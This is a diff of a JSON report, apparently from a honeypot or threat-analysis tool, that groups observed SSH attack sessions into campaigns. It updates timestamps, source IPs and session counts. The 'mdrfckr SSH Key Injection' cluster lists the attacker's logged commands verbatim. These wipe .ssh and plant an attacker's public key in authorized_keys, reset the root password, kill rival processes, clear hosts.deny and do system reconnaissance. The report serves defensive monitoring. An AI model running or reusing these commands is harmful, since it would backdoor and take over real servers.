@@ -1,6 +1,6 @@
 {
-  "generated_at": "2026-03-26T22:27:34.966662+00:00",
-  "total_sessions_with_commands": 5,
+  "generated_at": "2026-03-27T02:06:43.211982+00:00",
+  "total_sessions_with_commands": 4,
   "total_clusters": 2,
   "campaign_clusters": 2,
   "singleton_clusters": 0,
@@ -10,8 +10,8 @@
       "cluster_id": "CLU-001",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 3,
-      "unique_ip_count": 3,
+      "session_count": 2,
+      "unique_ip_count": 2,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -61,14 +61,13 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 3,
+      "session_count": 2,
       "unique_ips": [
-        "180.76.96.235",
-        "180.153.91.15",
-        "14.103.121.78"
+        "120.48.11.36",
+        "31.56.228.30"
       ],
-      "unique_ip_count": 3,
-      "sequence_hash": "9b5b5f321ad4664d",
+      "unique_ip_count": 2,
+      "sequence_hash": "8cdf38848db0a064",
       "ttps": [
         {
           "id": "T1021.004",
@@ -115,7 +114,7 @@
         "cd ~; chattr -ia .ssh; lockr -ia .ssh",
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
         "cat /proc/cpuinfo | grep name | wc -l",
-        "echo \"root:hPToZzNInBNl\"|chpasswd|bash",
+        "echo \"root:JLv1k2dnjfnu\"|chpasswd|bash",
         "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
         "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
@@ -125,28 +124,20 @@
       ],
       "members": [
         {
-          "session_id": "IR-6b653f5f270e",
-          "src_ip": "180.76.96.235",
+          "session_id": "IR-e081136fe4d4",
+          "src_ip": "31.56.228.30",
           "country": "",
           "isp": "",
           "command_count": 19,
-          "timestamp": "2026-03-26T21:33:49.017417Z"
+          "timestamp": "2026-03-27T00:12:07.892932Z"
         },
         {
-          "session_id": "IR-186c527d398e",
-          "src_ip": "180.153.91.15",
+          "session_id": "IR-a4043af8a982",
+          "src_ip": "120.48.11.36",
           "country": "",
           "isp": "",
           "command_count": 19,
-          "timestamp": "2026-03-26T21:39:38.565317Z"
-        },
-        {
-          "session_id": "IR-d50ca1a2ec57",
-          "src_ip": "14.103.121.78",
-          "country": "",
-          "isp": "",
-          "command_count": 19,
-          "timestamp": "2026-03-26T21:46:06.763046Z"
+          "timestamp": "2026-03-27T00:56:45.135556Z"
         }
       ]
     },
@@ -172,8 +163,8 @@
       ],
       "session_count": 2,
       "unique_ips": [
-        "197.248.104.19",
-        "103.171.69.82"
+        "83.171.89.209",
+        "118.99.80.29"
       ],
       "unique_ip_count": 2,
       "sequence_hash": "98af0db988d5971c",
@@ -205,20 +196,20 @@
       ],
       "members": [
         {
-          "session_id": "IR-3fa840fb5fdd",
-          "src_ip": "197.248.104.19",
+          "session_id": "IR-e0c57c34d48d",
+          "src_ip": "118.99.80.29",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-03-26T21:02:43.842307Z"
+          "timestamp": "2026-03-27T01:20:27.041390Z"
         },
         {
-          "session_id": "IR-a4e570f24cec",
-          "src_ip": "103.171.69.82",
+          "session_id": "IR-b8a51b1e7210",
+          "src_ip": "83.171.89.209",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-03-26T21:31:39.982794Z"
+          "timestamp": "2026-03-27T01:22:43.950774Z"
         }
       ]
     }
